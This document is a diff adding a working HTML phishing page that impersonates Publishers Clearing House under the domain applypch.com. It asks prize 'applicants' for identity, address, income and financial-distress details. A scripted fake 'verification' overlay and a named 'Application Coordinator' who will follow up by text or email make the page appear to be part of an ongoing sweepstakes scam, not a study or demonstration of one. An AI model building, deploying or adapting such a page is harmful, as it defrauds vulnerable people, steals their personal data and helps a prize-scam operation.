@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Complete Your PCH Application Profile</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --pch-orange: #f57c00;
+      --pch-orange-dark: #e65100;
+      --pch-orange-soft: #fff3e0;
+      --pch-border: #e0e0e0;
+      --pch-text: #212121;
+      --pch-muted: #616161;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: Inter, system-ui, sans-serif;
+      background: #ebebeb;
+      padding: 24px 12px 48px;
+      color: var(--pch-text);
+    }
+    .document {
+      max-width: 8.5in;
+      margin: 0 auto;
+      background: #fff;
+      box-shadow: 0 2px 16px rgba(0, 0, 0, 0.08);
+    }
+    .header {
+      background: linear-gradient(135deg, var(--pch-orange) 0%, var(--pch-orange-dark) 100%);
+      color: #fff;
+      padding: 24px 32px 20px;
+      text-align: center;
+    }
+    .header-logo img {
+      height: 48px;
+      width: auto;
+      background: #fff;
+      border-radius: 8px;
+      padding: 5px 8px;
+      margin-bottom: 12px;
+    }
+    .header-brand { font-size: 10.5pt; font-weight: 600; margin-bottom: 10px; }
+    .header h1 {
+      font-size: 14pt;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .header p { font-size: 10pt; margin-top: 8px; opacity: 0.95; }
+    .body { padding: 32px 36px 36px; font-size: 11pt; line-height: 1.5; }
+    .intro {
+      background: var(--pch-orange-soft);
+      border-left: 4px solid var(--pch-orange);
+      padding: 14px 16px;
+      margin-bottom: 22px;
+      font-size: 10pt;
+    }
+    .meta-box {
+      border: 1px solid var(--pch-border);
+      border-left: 4px solid var(--pch-orange);
+      padding: 14px 16px;
+      margin-bottom: 22px;
+    }
+    .field-row {
+      display: grid;
+      grid-template-columns: 150px 1fr;
+      gap: 6px 10px;
+      align-items: center;
+      margin-bottom: 8px;
+      font-size: 10pt;
+    }
+    .field-row:last-child { margin-bottom: 0; }
+    .field-row label { font-weight: 600; }
+    .field-row.full { grid-template-columns: 1fr; }
+    .field-row.full label { margin-bottom: 4px; }
+    input[type='text'], input[type='email'], input[type='tel'], input[type='date'], select, textarea {
+      width: 100%;
+      font-family: Inter, sans-serif;
+      font-size: 10.5pt;
+      padding: 8px 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      background: #fff;
+      color: var(--pch-text);
+    }
+    textarea { min-height: 72px; resize: vertical; }
+    input[readonly] { background: #f5f5f5; color: #555; }
+    input:focus, select:focus, textarea:focus {
+      outline: 1px solid var(--pch-orange);
+      border-color: var(--pch-orange);
+    }
+    .section { margin-bottom: 22px; }
+    .section-title {
+      font-weight: 700;
+      font-size: 9.5pt;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--pch-orange-dark);
+      margin-bottom: 10px;
+      padding-bottom: 3px;
+      border-bottom: 2px solid var(--pch-orange);
+    }
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px 16px;
+    }
+    @media (max-width: 600px) {
+      .field-row { grid-template-columns: 1fr; }
+      .grid-2 { grid-template-columns: 1fr; }
+      .body { padding: 20px 16px; }
+    }
+    .confirm-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin: 20px 0;
+      font-size: 10pt;
+    }
+    .confirm-row input { width: auto; margin-top: 3px; flex-shrink: 0; }
+    .actions {
+      margin-top: 24px;
+      padding-top: 20px;
+      border-top: 1px solid var(--pch-border);
+      text-align: center;
+    }
+    .btn {
+      font-family: inherit;
+      font-size: 10.5pt;
+      font-weight: 600;
+      padding: 12px 24px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      background: var(--pch-orange);
+      color: #fff;
+      min-width: 240px;
+    }
+    .btn:hover { background: var(--pch-orange-dark); }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .status { font-size: 10pt; margin-top: 10px; min-height: 1.4em; }
+    .status.error { color: #c62828; }
+    .footer { margin-top: 16px; font-size: 8pt; color: var(--pch-muted); text-align: center; }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.92);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    .overlay.visible { display: flex; }
+    .overlay-card {
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      padding: 32px 28px;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+      border: 1px solid var(--pch-border);
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid var(--pch-orange-soft);
+      border-top-color: var(--pch-orange);
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .process-step {
+      font-size: 11pt;
+      font-weight: 600;
+      color: var(--pch-text);
+      min-height: 1.5em;
+      transition: opacity 0.3s;
+    }
+    .process-sub { font-size: 9.5pt; color: var(--pch-muted); margin-top: 8px; }
+
+    .success-screen { display: none; text-align: center; padding: 40px 24px; }
+    .success-screen.visible { display: block; }
+    .success-icon {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: #e8f5e9;
+      color: #2e7d32;
+      font-size: 28px;
+      line-height: 56px;
+      margin: 0 auto 16px;
+      font-weight: 700;
+    }
+    .success-screen h2 { font-size: 16pt; margin-bottom: 10px; color: var(--pch-text); }
+    .success-screen p { font-size: 10.5pt; color: var(--pch-muted); max-width: 420px; margin: 0 auto 8px; line-height: 1.55; }
+    .form-hidden { display: none !important; }
+  </style>
+</head>
+<body>
+  <div class="overlay" id="processing-overlay" aria-live="polite">
+    <div class="overlay-card">
+      <div class="spinner"></div>
+      <p class="process-step" id="process-step">Verifying your information…</p>
+      <p class="process-sub">Please wait — your application is being processed.</p>
+    </div>
+  </div>
+
+  <form class="document" id="profile-form">
+    <header class="header">
+      <div class="header-logo">
+        <img src="/logo.png" alt="Publishers Clearing House" width="110" height="48" />
+      </div>
+      <div class="header-brand">Publisher&rsquo;s Clearing House | PCH Digital</div>
+      <h1>Application &amp; Verification Profile</h1>
+      <p>Complete your file for final review — current prize drawing</p>
+    </header>
+
+    <div class="body" id="form-body">
+      <p class="intro">
+        You confirmed your application on our official line. Please complete every section below.
+        This replaces text or email back-and-forth — your answers are recorded securely for final review.
+      </p>
+
+      <div class="meta-box">
+        <div class="field-row">
+          <label for="app_ref">Application reference</label>
+          <input type="text" id="app_ref" name="app_ref" readonly required />
+        </div>
+        <div class="field-row">
+          <label for="prize_category">Prize category</label>
+          <input type="text" id="prize_category" name="prize_category" readonly required />
+        </div>
+        <div class="field-row">
+          <label for="app_date">Date submitted</label>
+          <input type="date" id="app_date" name="app_date" readonly required />
+        </div>
+      </div>
+
+      <section class="section">
+        <div class="section-title">1. Identity verification</div>
+        <div class="field-row">
+          <label for="full_name">Full legal name</label>
+          <input type="text" id="full_name" name="full_name" required />
+        </div>
+        <div class="field-row">
+          <label for="dob">Date of birth</label>
+          <input type="date" id="dob" name="dob" required />
+        </div>
+        <div class="field-row">
+          <label for="email">Email</label>
+          <input type="email" id="email" name="email" required />
+        </div>
+        <div class="field-row">
+          <label for="phone">Mobile phone</label>
+          <input type="tel" id="phone" name="phone" required />
+        </div>
+      </section>
+
+      <section class="section">
+        <div class="section-title">2. Mailing address</div>
+        <div class="field-row full">
+          <label for="address_street">Street address</label>
+          <input type="text" id="address_street" name="address_street" required />
+        </div>
+        <div class="grid-2">
+          <div class="field-row full">
+            <label for="address_city">City</label>
+            <input type="text" id="address_city" name="address_city" required />
+          </div>
+          <div class="field-row full">
+            <label for="address_region">State / Region</label>
+            <input type="text" id="address_region" name="address_region" required />
+          </div>
+        </div>
+        <div class="grid-2">
+          <div class="field-row full">
+            <label for="postal_code">Postal / ZIP code</label>
+            <input type="text" id="postal_code" name="postal_code" required />
+          </div>
+          <div class="field-row full">
+            <label for="address_country">Country</label>
+            <input type="text" id="address_country" name="address_country" required />
+          </div>
+        </div>
+      </section>
+
+      <section class="section">
+        <div class="section-title">3. Applicant profile (final review)</div>
+        <div class="grid-2">
+          <div class="field-row full">
+            <label for="marital_status">Marital status</label>
+            <select id="marital_status" name="marital_status" required>
+              <option value="">Select</option>
+              <option>Single</option>
+              <option>Married</option>
+              <option>Divorced</option>
+              <option>Widowed</option>
+              <option>Domestic partnership</option>
+            </select>
+          </div>
+          <div class="field-row full">
+            <label for="dependents">Number of dependents</label>
+            <input type="text" id="dependents" name="dependents" required placeholder="0" />
+          </div>
+        </div>
+        <div class="grid-2">
+          <div class="field-row full">
+            <label for="employment">Employment status</label>
+            <select id="employment" name="employment" required>
+              <option value="">Select</option>
+              <option>Employed full-time</option>
+              <option>Employed part-time</option>
+              <option>Self-employed</option>
+              <option>Retired</option>
+              <option>Disabled</option>
+              <option>Unemployed</option>
+              <option>Student</option>
+            </select>
+          </div>
+          <div class="field-row full">
+            <label for="monthly_income">Monthly income (approx.)</label>
+            <input type="text" id="monthly_income" name="monthly_income" required placeholder="e.g. $2,200" />
+          </div>
+        </div>
+        <div class="field-row full">
+          <label for="financial_pressure">Biggest financial pressure</label>
+          <select id="financial_pressure" name="financial_pressure" required>
+            <option value="">Select</option>
+            <option>Debt</option>
+            <option>Rent / housing</option>
+            <option>Medical bills</option>
+            <option>Family support</option>
+            <option>Business expenses</option>
+            <option>Financially stable</option>
+            <option>Other</option>
+          </select>
+        </div>
+        <div class="field-row full">
+          <label for="mega_prize_plan">If you won the Mega Prize, what would you do with it?</label>
+          <textarea id="mega_prize_plan" name="mega_prize_plan" required></textarea>
+        </div>
+        <div class="field-row full">
+          <label for="accept_lower_tier">If awarded a tier below the Mega Prize, would you still accept?</label>
+          <select id="accept_lower_tier" name="accept_lower_tier" required>
+            <option value="">Select</option>
+            <option value="Yes">Yes</option>
+            <option value="No">No</option>
+          </select>
+        </div>
+      </section>
+
+      <label class="confirm-row">
+        <input type="checkbox" name="info_confirm" required />
+        <span>I confirm all information is true and complete. I understand this is for Publishers Clearing House final review of my application in the current drawing — not a final prize award.</span>
+      </label>
+
+      <div class="actions">
+        <button type="submit" class="btn" id="submit-btn">Submit application profile</button>
+        <p class="status" id="status"></p>
+      </div>
+      <p class="footer">applypch.com — official application processing only</p>
+    </div>
+
+    <div class="body success-screen" id="success-screen">
+      <div class="success-icon">✓</div>
+      <h2>Application profile received</h2>
+      <p>Your complete application and verification profile has been submitted successfully.</p>
+      <p>A confirmation email has been sent to <strong id="success-email"></strong>. Your file is being processed for <strong>final review</strong> in the current Publishers Clearing House prize drawing.</p>
+      <p style="margin-top:16px;">Dave Sayer, your PCH Application Coordinator, will contact you on your official text or email thread with the next update.</p>
+      <p class="footer" style="margin-top:24px;">You may close this page.</p>
+    </div>
+  </form>
+
+  <script>
+    (function () {
+      var params = new URLSearchParams(window.location.search);
+      var form = document.getElementById('profile-form');
+      var overlay = document.getElementById('processing-overlay');
+      var processStep = document.getElementById('process-step');
+      var formBody = document.getElementById('form-body');
+      var successScreen = document.getElementById('success-screen');
+      var submitBtn = document.getElementById('submit-btn');
+      var status = document.getElementById('status');
+
+      function setField(name, value) {
+        var el = form.querySelector('[name="' + name + '"]');
+        if (el && value) el.value = value;
+      }
+
+      setField('app_ref', params.get('ref') || '');
+      setField('prize_category', params.get('category') || '');
+      setField('app_date', params.get('date') || new Date().toISOString().slice(0, 10));
+      setField('full_name', params.get('name') || '');
+      setField('email', params.get('email') || '');
+      setField('phone', params.get('phone') || '');
+      setField('address_street', params.get('address') || '');
+      setField('address_city', params.get('city') || '');
+      setField('address_region', params.get('region') || '');
+      setField('postal_code', params.get('postal') || '');
+      setField('address_country', params.get('country') || '');
+
+      var steps = [
+        'Verifying your information…',
+        'Recording application profile…',
+        'Submitting to PCH Digital…',
+        'Processing for final review…',
+      ];
+      var stepIndex = 0;
+      var stepTimer;
+
+      function runProcessingSteps() {
+        stepIndex = 0;
+        processStep.textContent = steps[0];
+        overlay.classList.add('visible');
+        stepTimer = setInterval(function () {
+          stepIndex++;
+          if (stepIndex < steps.length) {
+            processStep.style.opacity = '0';
+            setTimeout(function () {
+              processStep.textContent = steps[stepIndex];
+              processStep.style.opacity = '1';
+            }, 200);
+          }
+        }, 1100);
+      }
+
+      function stopProcessing() {
+        clearInterval(stepTimer);
+        overlay.classList.remove('visible');
+      }
+
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        status.textContent = '';
+        status.className = 'status';
+
+        var fd = new FormData(form);
+        var payload = {
+          appRef: fd.get('app_ref'),
+          prizeCategory: fd.get('prize_category'),
+          appDate: fd.get('app_date'),
+          fullName: fd.get('full_name'),
+          dob: fd.get('dob'),
+          email: fd.get('email'),
+          phone: fd.get('phone'),
+          addressStreet: fd.get('address_street'),
+          addressCity: fd.get('address_city'),
+          addressRegion: fd.get('address_region'),
+          postalCode: fd.get('postal_code'),
+          addressCountry: fd.get('address_country'),
+          maritalStatus: fd.get('marital_status'),
+          dependents: fd.get('dependents'),
+          employment: fd.get('employment'),
+          monthlyIncome: fd.get('monthly_income'),
+          financialPressure: fd.get('financial_pressure'),
+          megaPrizePlan: fd.get('mega_prize_plan'),
+          acceptLowerTier: fd.get('accept_lower_tier'),
+          infoConfirm: fd.get('info_confirm') === 'on',
+        };
+
+        submitBtn.disabled = true;
+        runProcessingSteps();
+
+        fetch('/api/application-profile', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        })
+          .then(function (res) {
+            return res.json().then(function (data) {
+              return { ok: res.ok, data: data };
+            });
+          })
+          .then(function (result) {
+            setTimeout(function () {
+              stopProcessing();
+              if (result.ok) {
+                formBody.classList.add('form-hidden');
+                document.getElementById('success-email').textContent = payload.email;
+                successScreen.classList.add('visible');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+              } else {
+                status.textContent = result.data.error || 'Submission failed. Please try again.';
+                status.className = 'status error';
+                submitBtn.disabled = false;
+              }
+            }, 4500);
+          })
+          .catch(function () {
+            stopProcessing();
+            status.textContent = 'Could not connect. Check your internet and try again.';
+            status.className = 'status error';
+            submitBtn.disabled = false;
+          });
+      });
+    })();
+  </script>
+</body>
+</html>
